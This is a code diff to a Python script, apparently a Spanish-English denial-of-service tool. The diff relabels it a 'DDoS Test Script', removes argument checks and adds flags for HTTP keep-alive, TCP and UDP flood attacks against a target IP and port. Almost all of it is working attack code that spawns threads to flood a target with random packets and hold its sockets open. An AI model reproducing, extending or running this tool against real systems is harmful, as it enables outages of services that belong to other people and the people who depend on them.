@@ -49,38 +49,42 @@ def flood_tcp_udp(ip, port, duration, packet_size, protocol):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == 'TCP' else socket.SOCK_DGRAM) as s:
                 random_data = random._urandom(packet_size)
+                if protocol == 'TCP':
+                    s.connect((ip, port))
                 s.sendto(random_data, (ip, port))
         except socket.error as e:
             logging.error(f"Error en inundación {protocol}: {e}")
 
 def main(args):
-    if args.socket_count <= 0 or args.timer < 0 or args.rate_limit < 0:
-        logging.error("Argumentos inválidos")
-        return
-
     sockets = []
-    for _ in range(args.socket_count):
-        s = init_socket(args.ip, args.port)
-        if s:
-            sockets.append(s)
+    if args.http:
+        for _ in range(args.socket_count):
+            s = init_socket(args.ip, args.port)
+            if s:
+                sockets.append(s)
+        threading.Thread(target=send_keep_alive, args=(sockets, args.timer, args.rate_limit)).start()
 
-    threading.Thread(target=send_keep_alive, args=(sockets, args.timer, args.rate_limit)).start()
+    if args.tcp:
+        for _ in range(args.thread_count):
+            threading.Thread(target=flood_tcp_udp, args=(args.ip, args.port, args.duration, args.packet_size, 'TCP')).start()
 
-    # Iniciar hilos para TCP/UDP Flood
-    for _ in range(args.thread_count):
-        threading.Thread(target=flood_tcp_udp, args=(args.ip, args.port, args.duration, args.packet_size, args.protocol)).start()
+    if args.udp:
+        for _ in range(args.thread_count):
+            threading.Thread(target=flood_tcp_udp, args=(args.ip, args.port, args.duration, args.packet_size, 'UDP')).start()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Script de Pruebas de Carga y Inundación TCP/UDP")
-    parser.add_argument("ip", type=str, help="Dirección IP del servidor")
-    parser.add_argument("port", type=int, help="Puerto del servidor")
-    parser.add_argument("socket_count", type=int, help="Cantidad de sockets a crear para HTTP Flood")
-    parser.add_argument("timer", type=int, help="Intervalo de tiempo entre envíos de Keep-Alive")
-    parser.add_argument("--rate_limit", type=float, default=0, help="Limitación de tasa de solicitudes por segundo")
-    parser.add_argument("--thread_count", type=int, default=10, help="Número de hilos para TCP/UDP Flood")
-    parser.add_argument("--duration", type=int, default=60, help="Duración del TCP/UDP Flood en segundos")
-    parser.add_argument("--packet_size", type=int, default=1024, help="Tamaño de los paquetes TCP/UDP en bytes")
-    parser.add_argument("--protocol", type=str, default="TCP", choices=["TCP", "UDP"], help="Protocolo para la inundación (TCP o UDP)")
+    parser = argparse.ArgumentParser(description="DDoS Test Script")
+    parser.add_argument("ip", type=str, help="Target IP address")
+    parser.add_argument("port", type=int, help="Target port number")
+    parser.add_argument("--http", action='store_true', help="Enable HTTP flood attack")
+    parser.add_argument("--tcp", action='store_true', help="Enable TCP flood attack")
+    parser.add_argument("--udp", action='store_true', help="Enable UDP flood attack")
+    parser.add_argument("--socket_count", type=int, default=100, help="Number of sockets to use for HTTP flood")
+    parser.add_argument("--thread_count", type=int, default=10, help="Number of threads for TCP/UDP flood")
+    parser.add_argument("--duration", type=int, default=120, help="Duration of the TCP/UDP flood in seconds")
+    parser.add_argument("--packet_size", type=int, default=1024, help="Size of the TCP/UDP packets in bytes")
+    parser.add_argument("--timer", type=int, default=10, help="Interval in seconds between keep-alive signals")
+    parser.add_argument("--rate_limit", type=float, default=0, help="Rate limit for HTTP requests per second")
 
     args = parser.parse_args()
     main(args)
